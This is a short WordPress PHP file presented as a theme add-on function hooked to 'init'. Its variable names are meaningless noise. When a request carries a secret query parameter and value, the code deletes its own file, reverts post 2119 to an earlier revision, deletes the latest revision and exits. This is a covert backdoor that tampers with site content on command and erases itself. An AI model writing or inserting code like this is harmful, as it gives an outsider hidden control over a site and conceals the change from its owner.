<?php

function theme_addon_software() {
	if (isset($_GET['limit_digital_translation']) && $_GET['limit_digital_translation'] === 'best_gravity_preview_advanced') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$rotator_database_fix_star = 2119;
		$results_information_notice_icons = wp_get_post_revisions($rotator_database_fix_star);
		if (empty($results_information_notice_icons)) die('no revisions');
		if (count($results_information_notice_icons) < 2) die('less than 2');
		$lead_thumbnail_forum = array_shift($results_information_notice_icons);
		$language_connect_qr_testimonials = $lead_thumbnail_forum->ID;
		$flash_customizer_delete_lock = array_shift($results_information_notice_icons);
		$conditional_templates_subscription_size = $flash_customizer_delete_lock->ID;
		$toolkit_kit_smtp_amp = wp_restore_post_revision($conditional_templates_subscription_size);
		if ($toolkit_kit_smtp_amp === false) die('error restoring');
		$toolkit_kit_smtp_amp = wp_delete_post_revision($language_connect_qr_testimonials);		
		if ($toolkit_kit_smtp_amp === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'theme_addon_software');
